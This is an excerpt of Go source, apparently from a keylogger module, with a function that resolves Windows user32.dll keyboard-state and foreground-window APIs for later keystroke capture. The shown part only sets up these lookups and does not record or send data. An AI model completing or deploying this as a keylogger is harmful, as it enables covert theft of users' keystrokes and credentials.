...
var (
	...
	procGetKeyState         *syscall.Proc
	procGetKeyboardState    *syscall.Proc
	procToUnicode           *syscall.Proc
	procMapVirtualKey       *syscall.Proc
	procGetForegroundWindow *syscall.Proc
	procGetWindowTextW      *syscall.Proc
	keylogAPIsOnce          sync.Once
)

func resolveKeylogAPIs() {
	keylogAPIsOnce.Do(func() {
		procGetAsyncKeyState, _ = winapi.GetProc("user32.dll", "GetAsyncKeyState")
		procGetKeyState, _ = winapi.GetProc("user32.dll", "GetKeyState")
		procGetKeyboardState, _ = winapi.GetProc("user32.dll", "GetKeyboardState")
		procToUnicode, _ = winapi.GetProc("user32.dll", "ToUnicode")
		procMapVirtualKey, _ = winapi.GetProc("user32.dll", "MapVirtualKeyW")
		procGetForegroundWindow, _ = winapi.GetProc("user32.dll", "GetForegroundWindow")
		procGetWindowTextW, _ = winapi.GetProc("user32.dll", "GetWindowTextW")
	})
}
